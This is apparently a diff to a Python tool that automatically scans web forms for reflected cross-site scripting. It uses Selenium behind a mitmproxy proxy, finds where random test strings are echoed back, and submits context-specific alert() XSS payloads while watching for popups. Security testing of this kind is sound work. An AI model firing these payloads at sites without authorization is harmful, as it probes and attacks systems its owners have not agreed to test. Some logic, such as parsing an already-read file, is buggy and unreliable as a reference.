@@ -6,10 +6,17 @@ from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
 from selenium.common.exceptions import NoAlertPresentException
 from selenium.common.exceptions import UnexpectedAlertPresentException
+from bs4 import BeautifulSoup
 
-driver = webdriver.Firefox()
+# proxy information so mitmproxy can intercept the requests
+proxy_host = "127.0.0.1"
+proxy_port = 8080
 url = sys.argv[1]
-driver.get(url)
+proxy = f"{proxy_host}:{proxy_port}"
+options = webdriver.FirefoxOptions()
+options.add_argument(f'--proxy-server={proxy}')
+# launch Firefox with the configured proxy
+driver = webdriver.Firefox(options=options)
 
 
 def initial_form():
@@ -25,8 +32,6 @@ def initial_form():
                 if text_input.get_attribute('pattern'):
                     if text_input.get_attribute('required'):
                         print("there's a required input with a specific text pattern required")
-                    else:
-                        print("this isn't required")
             # otherwise generate random string and send keys
                 else:
                     ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -60,49 +65,50 @@ def initial_form():
 
 
 def search_site(inputs):
-    html_lines = {}
+    context = []
     # get page source to search for strings in html
     get_source = driver.page_source
+    # getting the html in this method includes things that were added when the page loads which page source doesn't have
+    page_source = driver.execute_script("return document.documentElement.outerHTML")
+
     for ran in inputs:
-        for line in get_source.splitlines():
-            if ran in line:
-                html_lines.update({line: ran})
-                print(line)
-    return html_lines
+        soup = BeautifulSoup(page_source, 'html.parser')
 
+        # Find all instances of the target string in the HTML
+        instances = soup.find_all(string=lambda text: text and ran in text)
+        if not instances:
+            return None
+        # add the context of each instance of the string to a list
+        for instance in instances:
+            parent_tags = [t.name for t in instance.parents]
+            if instance.find_parent("script"):
+                print(f"'{url}' is located within JavaScript.")
+                context.append("javascript")
+            elif any([tag is not None for tag in parent_tags]):
+                print(f"'{url}' is located between HTML tags.")
+                context.append("between")
 
-def get_context(html_lines):
-    context = []
-    for html in html_lines:
-        # getting the string in the html
-        ran = html_lines[html]
-        split_html = html.split(ran)
-        after = split_html[1]
-        print(after)
-        if after[:2] == "'<" or after[:1] == "<" or after[:2] == '"<':
-            context.append("between")
-            print(context)
-        elif after[:2] == "'>" or after[:2] == '">' or after[:1] == ">":
-            context.append("within")
-            print(context)
-        else:
-            context.append("other")
-            print(context)
-    return context
+            else:
+                print(f"'{url}' is located within an HTML tag.")
+                context.append("within")
+        return context
 
 
 def crawl_site(inputs):
     links = []
+    already_visited = []
     found_endpoint = False
     while not found_endpoint:
         page_links = driver.find_elements(By.XPATH, "//a[@href]")
         for link in page_links:
-            print(link.get_attribute("href"))
-            if link not in links:
+            #print(link.get_attribute("href"))
+            if link.get_attribute("href") not in links and link.get_attribute("href") not in already_visited:
+                print("adding to stack: " + link.get_attribute("href"))
                 links.append(link.get_attribute("href"))
         if not links:
             return False
         next_page = links.pop()
+        already_visited.append(next_page)
         driver.get(next_page)
         if search_site(inputs):
             return driver.current_url
@@ -110,7 +116,7 @@ def crawl_site(inputs):
 
 def dtr_payload(context):
     if context == "between":
-        betw_load = ["<img src=1 onerror=alert(1)>", "<script>alert(document.domain)</script>"]
+        betw_load = ["<img src=1 onerror=alert(1)>", "<script>alert(document.domain)</script>", "<><img src=1 onerror=alert(1)>"]
         return betw_load
 
     elif context == "within":
@@ -119,7 +125,7 @@ def dtr_payload(context):
     else:
         java_load = ["</script><img src=1 onerror=alert(document.domain)>", "'-alert(document.domain)-'",
                      "';alert(document.domain)//", "\\';alert(document.domain)//", "onerror=alert;throw 1",
-                     "&apos;-alert(document.domain)-&apos;", "${alert(document.domain)}"
+                     "&apos;-alert(document.domain)-&apos;", "${alert(document.domain)}", "javascript:alert(1)", "'-alert(1)-'", "${alert(1)}"
                      ]
         return java_load
 
@@ -179,62 +185,91 @@ def script_check():
         pass
 
 
-if __name__ == "__main__":
-    # submit initial query
-    form_inputs = initial_form()
+# def start_mitm(filename):
+#     #full_command = f"sudo mitmproxy -s {filename} --set url={url}"
+#     mitmproxy_command = ["sudo", "mitmproxy", "-s", "mitmproxy_script.py", "--set", f"url={url}", "&"]
+#     mitm_process = subprocess.run(mitmproxy_command, shell=True)
+#     print("launching mitmproxy")
+#     return mitm_process
+#
+#
+# def stop_mitm(process):
+#     process.terminate()
 
-    # look for strings submitted in form
-    in_html = search_site(form_inputs)
+
+def read_file(rands):
+    contexts = []
+    with open("packets.txt") as f:
+        print("file opened")
+        contents = f.read()
+
+        soup = BeautifulSoup(f, 'html.parser')
+        for ran in rands:
+            # Find all instances of the target string in the HTML
+            instances = soup.find_all(string=lambda text: text and ran in text)
+            if not instances:
+                return None
+            # Print the context of each instance of the target string
+            for instance in instances:
+                parent_tags = [t.name for t in instance.parents]
+                if instance.find_parent("script"):
+                    print(f"'{url}' is located within JavaScript.")
+                    contexts.append("javascript")
+                elif any([tag is not None for tag in parent_tags]):
+                    print(f"'{url}' is located between HTML tags.")
+                    contexts.append("between")
+
+                else:
+                    print(f"'{url}' is located within an HTML tag.")
+                    contexts.append("within")
+            return contexts
+
+
+def test_payloads(contexts):
     is_script = False
-    # if strings were in html, determine their context
-    if in_html:
-        # get context for each line containing the random strings
-        got_contexts = get_context(in_html)
-        for got_context in got_contexts:
-            # determine payload based on context
-            use_payloads = dtr_payload(got_context)
-            # loop through payloads until there are  either no more or xss is detected
-            for use_payload in use_payloads:
-                # submit form again with payload and break if there were any pop ups while trying to submit payload
-                if not submit_form(use_payload):
-                    print("pop up detected while submitting payload")
-                    is_script = True
-                    break
-                # check for popup
-                is_script = script_check()
+    for context in contexts:
+        # determine payload based on context
+        use_payloads = dtr_payload(context)
+        # loop through payloads until there are  either no more or xss is detected
+        for use_payload in use_payloads:
+            # submit form again with payload and break if there were any pop ups while trying to submit payload
+            if not submit_form(use_payload):
+                print("pop up detected while submitting payload")
+                is_script = True
+                return is_script
+            # check for popup
+            is_script = script_check()
 
-                if is_script:
-                    print("xss vulnerability detected")
-                    break
             if is_script:
-                break
-    else:
-        # time to crawl through the site looking for an exit point to the input
-        exit_point = crawl_site(form_inputs)
-        if exit_point:
-            in_html = search_site(form_inputs)
-            # get context for each line containing the random strings
-            got_contexts = get_context(in_html)
-            for got_context in got_contexts:
-                # determine payload based on context
-                use_payloads = dtr_payload(got_context)
-                # loop through payloads until there are  either no more or xss is detected
-                for use_payload in use_payloads:
-                    # submit form again with payload and break if there were any pop ups while trying to submit payload
-                    if not submit_form(use_payload):
-                        print("pop up detected while submitting payload")
-                        is_script = True
-                        break
-                    # go back to exit point to check for popups
-                    driver.get(exit_point)
-                    # check for popup
-                    is_script = script_check()
+                print("xss vulnerability detected")
+                return is_script
+        if is_script:
+            return is_script
+    return is_script
 
-                    if is_script:
-                        print("xss vulnerability detected")
-                        break
-                if is_script:
-                    break
-        else:
-            print("There are no xss vulnerabilities in this site")
+
+if __name__ == "__main__":
+    file = "scapyTest.py"
+    driver.get(url)
+    form = initial_form()
+    contexts1 = search_site(form)
+    contexts2 = read_file(form)
+    if contexts1 or contexts2:
+        if contexts1:
+            test_payloads(contexts1)
+        if contexts2:
+            test_payloads(contexts2)
+    else:
+        exit_point = crawl_site(form)
+        if exit_point:
+            contexts1 = search_site(form)
+            contexts2 = read_file(form)
+            if contexts1 or contexts2:
+                if contexts1:
+                    test_payloads(contexts1)
+                if contexts2:
+                    test_payloads(contexts2)
+
+
+
 
